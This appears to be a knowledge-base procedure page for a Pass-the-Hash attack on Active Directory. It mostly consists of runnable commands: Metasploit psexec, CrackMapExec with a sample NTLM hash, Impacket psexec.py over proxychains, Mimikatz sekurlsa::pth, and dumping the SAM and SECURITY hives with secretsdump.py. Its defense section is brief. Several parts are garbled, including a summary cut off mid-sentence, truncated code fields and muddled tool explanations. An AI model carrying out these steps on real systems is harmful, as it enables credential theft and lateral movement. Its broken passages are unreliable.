---
id: 6248c79d-dbb1-4936-9478-ea18fb53eab2
name: Pass-the-Hash Active Directory Attack
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:05.086376+00:00'
updated_at: '2023-04-10T20:25:57.022379+00:00'
tactics:
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Pass the Hash|T1075 - Pass the Hash]]'
tags:
- '[[Active Directory Attacks]]'
- '[[Pass-the-Hash]]'
commands:
- '[[Execute psexec.py with proxychains]]'
- '[[Run whoami command on SMB server]]'
---

# Pass-the-Hash Active Directory Attack

## Summary

Pass-the-Hash (PtH) is a technique used to authenticate to a remote server or service by using the underlying NTLM hash of a user's password, instead of the plaintext password itself. This procedure involves several commands, including Remote Code Execution via SMB with Metasploit, Retrieve current

## Description

# Description

Pass-the-Hash (PtH) is a technique used to authenticate to a remote server or service by using the underlying NTLM hash of a user's password, instead of the plaintext password itself. This procedure involves several commands, including Remote Code Execution via SMB with Metasploit, Retrieve current user with CrackMapExec, Proxychains Impacket Psexec, Remote Desktop Connection using Mimikatz, and Extract Local Administrator Hash. The attacker can use these commands to gain access to a system and extract password hashes, which can be used to authenticate to other systems on the network. This technique can be used to move laterally within the network and escalate privileges.

## Requirements

1. Valid credentials or password hashes

1. Access to the network

## Defense

1. Implement multi-factor authentication to prevent the use of stolen credentials

1. Monitor network traffic for signs of PtH attacks

1. Limit user privileges to minimize the impact of a successful attack

## Objectives

1. Gain access to a system on the network

1. Extract password hashes

1. Authenticate to other systems on the network

1. Move laterally within the network

1. Escalate privileges

# Instructions

1. To execute this command, you need to have Metasploit installed on your system. This command exploits a vulnerability in the SMB protocol to execute remote code on a Windows machine. The command uses the psexec module from Metasploit to execute a meterpreter payload on the target system. The RHOST parameter should be set to the IP address of the target system. The SMBUser and SMBPass parameters should be set to a valid username and password or NT hash for the target system. 

**Code**: [[use exploit/windows/smb/psexec
set RHOST 10.2.0.3
]]

> - use: This command is used to select an exploit module from the Metasploit framework.
- set RHOST: This sets the IP address of the target system.
- set SMBUser: This sets the username for the SMB connection.
- set SMBPass: This sets the password or NT hash for the SMB connection.
- set PAYLOAD: This sets the payload that will be executed on the target system.
- run: This command executes the exploit.
- shell: This command drops the user into a meterpreter shell on the target system.

2. Use the CrackMapExec tool to retrieve the current user on the specified IP range.

**Code**: [[cme smb 10.2.0.2/24 -u jarrieta -H 'aad3b435b51404]]

> - smb: specifies the protocol to use
- 10.2.0.2/24: specifies the IP range to scan
- -u jarrieta: specifies the username to use for authentication
- -H 'aad3b435b51404eeaad3b435b51404ee:489a04c09a5debbc9b975356693e179d': specifies the NTLM hash to use for authentication
- -x "whoami": specifies the command to run on the target system to retrieve the current user.

**Command** ([[Run whoami command on SMB server]]):

```bash
cme smb 10.2.0.2/24 -u jarrieta -H 'aad3b435b51404eeaad3b435b51404ee:489a04c09a5debbc9b975356693e179d' -x "whoami"
```

3. This command uses the Impacket suite to execute commands on a remote Windows machine using SMB.

**Code**: [[proxychains python ./psexec.py jarrieta@10.2.0.2 -]]

> The 'proxychains' command is used to route traffic through a proxy server. 'python' is used to execute the 'psexec.py' script from the Impacket suite. The script is used to remotely execute commands on a Windows machine using SMB. The 'jarrieta@10.2.0.2' specifies the username and IP address of the remote machine. The '-hashes' option specifies the NTLM hash of the user's password. This command can be used to remotely execute commands on a Windows machine without the need for a clear-text password.

**Command** ([[Execute psexec.py with proxychains]]):

```bash
proxychains python ./psexec.py jarrieta@10.2.0.2 -hashes :489a04c09a5debbc9b975356693e179d
```

4. The above command is used to establish a Remote Desktop Connection using Mimikatz. The command uses the 'sekurlsa::pth' module of Mimikatz to obtain the NTLM hash of the specified user and then uses it to authenticate the user to the target system. The 'mstsc.exe /restrictedadmin' argument is used to launch the Remote Desktop Connection in Restricted Admin mode, which provides additional security benefits.

**Code**: [[sekurlsa::pth /user:Administrator /domain:contoso.]]

> The command can be used by an attacker to gain access to a remote system using the credentials of a valid user. The 'sekurlsa::pth' module of Mimikatz is used to perform Pass-the-Hash attacks, which allows an attacker to authenticate to a system using the NTLM hash of a user's password, without actually knowing the password. The 'mstsc.exe /restrictedadmin' argument is used to launch the Remote Desktop Connection in Restricted Admin mode, which provides additional security benefits, such as preventing the attacker from using the Remote Desktop Connection to perform administrative tasks on the target system.

5. To extract the local SAM database, run the following commands in the command prompt:

reg.exe save hklm\sam c:\temp\sam.save
reg.exe save hklm\security c:\temp\security.save
reg.exe save hklm\system c:\temp\system.save

Then, use the secretsdump.py tool to extract the local administrator hash:

secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

**Code**: [[C:\> reg.exe save hklm\sam c:\temp\sam.save
C:\> r]]

> The first set of commands saves the SAM, Security, and System registry hives to the specified file locations. These registry hives contain sensitive information, including password hashes.

The second command uses the secretsdump.py tool to extract the local administrator hash from the saved registry hives. The -sam, -security, and -system flags specify the locations of the saved registry hives, and the LOCAL flag indicates that the tool should extract the local user accounts and password hashes.

## MITRE ATT&CK Mapping

### Tactics

- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Pass the Hash|T1075 - Pass the Hash]]

## Commands Used

- [[Execute psexec.py with proxychains]]
- [[Run whoami command on SMB server]]

## Tags

- [[Active Directory Attacks]]
- [[Pass-the-Hash]]
